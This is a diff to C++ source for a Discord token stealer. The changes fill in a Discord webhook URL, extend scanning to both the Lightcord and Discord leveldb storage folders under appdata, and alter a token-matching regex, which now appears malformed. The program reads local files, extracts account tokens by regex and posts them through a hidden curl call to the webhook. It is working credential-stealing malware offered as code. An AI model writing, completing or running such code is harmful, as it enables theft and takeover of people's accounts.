@@ -13,7 +13,7 @@ bool send_token(std::string token) {
 	char cmd[1024];
 
 
-	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE >nul", token.c_str());
+	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840401711205711883/x >nul", token.c_str());
 
 	WinExec(cmd,SW_HIDE);
 	return true;
@@ -54,7 +54,7 @@ int main() {
 
 	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb" };
 
-	for (int i = 0; i < 1; i++) {
+	for (int i = 0; i < 2; i++) {
 		std::string path = std::getenv("appdata") + installs[i];
 		for (const auto& entry : fs::directory_iterator(path)) {
 			std::ifstream t(entry.path(),std::ios_base::binary);
@@ -62,7 +62,7 @@ int main() {
 			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
 			std::vector<std::string> matches;
 			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.
-			std::regex expression2(R"(mfa\.[\w-]{84})"); 
+			std::regex expression2(R"([\w-\{3}\.[\w-]{84})"); 
 
 			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
 			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
